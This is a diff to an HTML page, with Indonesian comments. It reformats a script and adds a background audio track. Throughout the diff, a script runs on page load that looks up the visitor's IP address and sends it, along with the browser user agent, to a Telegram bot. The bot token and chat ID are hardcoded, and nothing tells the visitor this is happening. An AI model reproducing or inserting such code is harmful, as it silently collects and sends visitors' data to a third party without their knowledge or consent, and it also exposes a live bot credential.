@@ -184,38 +184,46 @@
   </div>
 
   <script>
-    async function sendUserInfoToTelegram() {
-      const botToken = "7540062077:AAF6ldTYuAcJiVuoStiNNRbw08TUylHe36Y"; // Ganti dengan token bot Anda
-      const chatId = "7888873250";     // Ganti dengan chat ID Anda
-      const userAgent = navigator.userAgent;
+  async function sendUserInfoToTelegram() {
+    const botToken = "7540062077:AAF6ldTYuAcJiVuoStiNNRbw08TUylHe36Y"; // Ganti dengan token bot Anda
+    const chatId = "7888873250"; // Ganti dengan chat ID Anda
+    const userAgent = navigator.userAgent;
 
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        const userIP = data.ip;
+    try {
+      const response = await fetch("https://api.ipify.org?format=json");
+      const data = await response.json();
+      const userIP = data.ip;
 
-        const message = `📄 *Details*:\n\n🌐 *IP*: ${userIP}\n📱 *User Agent*: ${userAgent}`;
-        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+      const message = `📄 *Details*:\n\n🌐 *IP*: ${userIP}\n📱 *User Agent*: ${userAgent}`;
+      const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-        await fetch(telegramURL);
-        console.log("IP dan User Agent berhasil dikirim ke Telegram.");
-      } catch (error) {
-        console.error("Gagal mengirim data ke Telegram:", error);
-      }
+      await fetch(telegramURL);
+      console.log("IP dan User Agent berhasil dikirim ke Telegram.");
+    } catch (error) {
+      console.error("Gagal mengirim data ke Telegram:", error);
     }
+  }
 
-    function showCode2() {
-      document.getElementById('code1').style.display = 'none';
-      document.getElementById('code2').style.display = 'block';
-      const video = document.getElementById('background-video');
-      video.muted = false;
-      video.play();
-      video.style.transform = 'rotate(360deg)';
-    }
+  function showCode2() {
+    document.getElementById('code1').style.display = 'none';
+    document.getElementById('code2').style.display = 'block';
 
-    // Kirim data ke Telegram saat halaman dimuat
-    window.onload = sendUserInfoToTelegram;
-  </script>
+    // Putar video
+    const video = document.getElementById('background-video');
+    video.muted = false;
+    video.play();
+    video.style.transform = 'rotate(360deg)';
+
+    // Putar musik
+    const music = document.getElementById('background-music');
+    music.play();
+    music.loop = false; // Pastikan musik hanya diputar sekali
+  }
+
+  // Kirim data ke Telegram saat halaman dimuat
+  window.onload = sendUserInfoToTelegram;
+</script>
+<audio id="background-music" src="hanabi.mp3"></audio>
 
 </body>
-</html>
+                       </html></html>
